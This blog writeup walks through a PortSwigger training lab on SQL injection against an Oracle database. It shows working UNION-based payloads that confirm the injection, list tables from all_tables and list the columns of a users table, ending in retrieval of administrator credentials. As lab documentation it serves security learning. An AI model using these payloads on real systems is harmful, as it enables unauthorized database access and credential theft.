---
title: PortSwigger SQL Injection Lab 6 — Listing Database Contents on Oracle
description: A writeup of PortSwigger's Oracle SQL injection lab for enumerating tables, columns, and credentials.
author: Koussay Dhifi
categories: [Writeups, WebExploitation]
tags: [WebExploitation, SQLInjection, PortSwigger, Labs, Oracle]
pin: false
math: false
mermaid: true
---

## Introduction

This lab is very similar to the previous one, but it targets Oracle.

The goal is to enumerate the database structure and retrieve the administrator credentials.

## Recon

Like the other labs, the target is an e-commerce site with a vulnerable category filter.

![Lab 6 overview](../assets/sqli/lab6/6-1.png)

## Exploitation

First we confirm SQL injection with:

```sql
' OR '1'='1' --
```

That makes the app return unrelated results and proves the parameter is injectable.

To enumerate Oracle tables we use:

```sql
' UNION SELECT table_name, NULL FROM all_tables --
```

Then inspect the columns for the interesting table:

```sql
' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS_GDXCML' --
```

Finally we retrieve credentials from the relevant columns and solve the lab.

![Lab 6 table enumeration](../assets/sqli/lab6/6-2.png)

![Lab 6 solved](../assets/sqli/lab6/6-3.png)

## Conclusion

This lab shows that Oracle uses different metadata views, but the overall UNION injection approach is the same.
